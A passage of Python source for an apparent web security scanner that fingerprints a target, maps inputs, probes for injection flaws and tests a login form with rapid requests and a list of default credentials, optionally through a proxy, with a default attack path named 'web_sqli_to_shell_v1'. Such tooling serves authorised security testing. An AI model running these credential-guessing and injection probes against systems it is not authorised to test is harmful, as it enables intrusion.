             {"detail": "No command injection detected"})

    # ── WB-22: SSTI ──
    if ssti_found:
        emit(out, "WB-22", "realized", 1, "runtime",
             f"{base} SSTI scan", 0.85,
             attack_path_id, run_id, workload_id,
             {"detail": "Template expression evaluated in response"})
    else:
        emit(out, "WB-22", "unknown", 1, "runtime",
             f"{base} SSTI scan", 0.4,
             attack_path_id, run_id, workload_id,
             {"detail": "No SSTI detected"})

    # ── WB-07 + WB-08: Rate limiting + default creds (only if login found) ──
    if ctx.get("login_found"):
        login_forms = [f for f in forms
                       if any(i["type"] == "password" for i in f["inputs"])]

        if login_forms:
            lf = login_forms[0]
            action_url = lf.get("resolved_action", base)
            method = lf.get("method", "POST")

            user_field = None
            pass_field = None
            for inp in lf["inputs"]:
                if inp["type"] == "password":
                    pass_field = inp["name"]
                elif inp["type"] in ("text", "email") and not user_field:
                    user_field = inp["name"]

            if user_field and pass_field:
                # WB-07: Rate limiting check — send 12 rapid requests
                rate_limited = False
                statuses = []
                for i in range(12):
                    cred_body = urlencode({
                        user_field: f"skg_ratetest_{i}",
                        pass_field: "skg_ratetest"
                    }).encode()
                    resp = transport.request("POST", action_url,
                                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                                             body=cred_body)
                    if resp.error:
                        break
                    statuses.append(resp.status)
                    if resp.status == 429:
                        rate_limited = True
                        break
                    if "captcha" in resp.text.lower():
                        rate_limited = True
                        break

                if rate_limited:
                    emit(out, "WB-07", "blocked", 1, "runtime",
                         f"{action_url} rate limit check", 0.85,
                         attack_path_id, run_id, workload_id,
                         {"detail": "Rate limiting or CAPTCHA detected"})
                else:
                    emit(out, "WB-07", "realized", 1, "runtime",
                         f"{action_url} rate limit check", 0.8,
                         attack_path_id, run_id, workload_id,
                         {"detail": f"12 requests accepted, statuses: {statuses[-3:]}"})

                # WB-08: Default credentials
                default_accepted = False
                for uname, passwd in DEFAULT_CREDS:
                    cred_body = urlencode({
                        user_field: uname,
                        pass_field: passwd
                    }).encode()
                    resp = transport.request("POST", action_url,
                                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                                             body=cred_body)
                    if resp.error:
                        continue

                    # Heuristic: auth success = redirect to different page,
                    # or response contains "dashboard", "welcome", "logout"
                    auth_indicators = ["dashboard", "welcome", "logout", "my account",
                                       "sign out", "log out"]
                    if (resp.status in (301, 302, 303) or
                            any(ind in resp.text.lower() for ind in auth_indicators)):
                        default_accepted = True
                        emit(out, "WB-08", "realized", 1, "runtime",
                             f"{action_url} default creds", 0.9,
                             attack_path_id, run_id, workload_id,
                             {"detail": f"Default creds accepted: {uname}:{passwd}"})
                        break

                if not default_accepted:
                    emit(out, "WB-08", "blocked", 1, "runtime",
                         f"{action_url} default creds", 0.75,
                         attack_path_id, run_id, workload_id,
                         {"detail": f"Tested {len(DEFAULT_CREDS)} pairs, none accepted"})
    else:
        emit(out, "WB-07", "unknown", 1, "runtime",
             f"{base} rate limit check", 0.3,
             attack_path_id, run_id, workload_id,
             {"detail": "No login form found, rate limit not tested"})
        emit(out, "WB-08", "unknown", 1, "runtime",
             f"{base} default creds", 0.3,
             attack_path_id, run_id, workload_id,
             {"detail": "No login form found, default creds not tested"})

    # ── Wickets not actively tested in this phase ──
    # WB-13 (file upload), WB-15 (SSRF), WB-16 (session tokens),
    # WB-20 (db privs), WB-21 (webshell) — these require deeper
    # interaction or are results of exploitation, not recon.
    for wid in ["WB-13", "WB-15", "WB-16", "WB-20", "WB-21"]:
        emit(out, wid, "unknown", 1, "runtime",
             f"{base} (not probed in recon phase)", 0.2,
             attack_path_id, run_id, workload_id,
             {"detail": "Requires deeper interaction or exploitation phase"})

    ctx["sqli_found"] = sqli_found
    ctx["injectable_params"] = injectable_params
    ctx["xss_found"] = xss_found
    ctx["traversal_found"] = traversal_found
    ctx["cmdi_found"] = cmdi_found
    ctx["ssti_found"] = ssti_found
    return ctx


# ── Main: run all phases ─────────────────────────────────────────────────

def collect(target: str, out_path: str, attack_path_id: str,
            proxy: Optional[str] = None,
            run_id: Optional[str] = None,
            workload_id: Optional[str] = None,
            timeout: float = 10.0):
    """Run all four collection phases against a target."""
    out = Path(out_path)
    out.parent.mkdir(parents=True, exist_ok=True)

    rid = run_id or str(uuid.uuid4())
    wid = workload_id or urlparse(target).hostname or "unknown"

    transport = HttpTransport(proxy=proxy, timeout=timeout)

    print(f"[SKG-WEB] Target:     {target}")
    print(f"[SKG-WEB] Output:     {out}")
    print(f"[SKG-WEB] Attack-path: {attack_path_id}")
    print(f"[SKG-WEB] Run-ID:     {rid}")
    print(f"[SKG-WEB] Proxy:      {proxy or 'direct'}")
    print()

    # Phase 1
    print("[Phase 1] Service fingerprint...")
    ctx = phase1_fingerprint(transport, target, out, attack_path_id, rid, wid)
    if not ctx["reachable"]:
        print("[!] Target unreachable. Aborting.")
        return

    # Phase 2
    print("[Phase 2] Path discovery...")
    ctx = phase2_paths(transport, ctx, out, attack_path_id, rid, wid)

    # Phase 3
    print("[Phase 3] Input surface mapping...")
    ctx = phase3_inputs(transport, ctx, out, attack_path_id, rid, wid)

    # Phase 4
    print("[Phase 4] Injection probing...")
    ctx = phase4_inject(transport, ctx, out, attack_path_id, rid, wid)

    # Summary
    event_count = sum(1 for _ in open(out))
    print()
    print(f"[SKG-WEB] Complete. {event_count} events written to {out}")
    print(f"[SKG-WEB] Run projection: skg web project --in {out} "
          f"--attack-path-id {attack_path_id}")


def main():
    parser = argparse.ArgumentParser(
        description="SKG Web Active Collector — old-school recon, no external tools")
    parser.add_argument("--target", required=True,
                        help="Target URL (e.g. http://192.168.1.50)")
    parser.add_argument("--out", required=True,
                        help="Output NDJSON event file")
    parser.add_argument("--attack-path-id", dest="attack_path_id",
                        default="web_sqli_to_shell_v1",
                        help="Attack path to evaluate")
    parser.add_argument("--proxy", default=None,
                        help="Proxy URL (socks5://..., socks4://..., http://...)")
    parser.add_argument("--run-id", dest="run_id", default=None)
    parser.add_argument("--workload-id", dest="workload_id", default=None)
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="Per-request timeout in seconds")
    args = parser.parse_args()

    collect(
        target=args.target,
        out_path=args.out,
        attack_path_id=args.attack_path_id,
        proxy=args.proxy,
        run_id=args.run_id,
        workload_id=args.workload_id,
        timeout=args.timeout,
    )


if __name__ == "__main__":
    main()
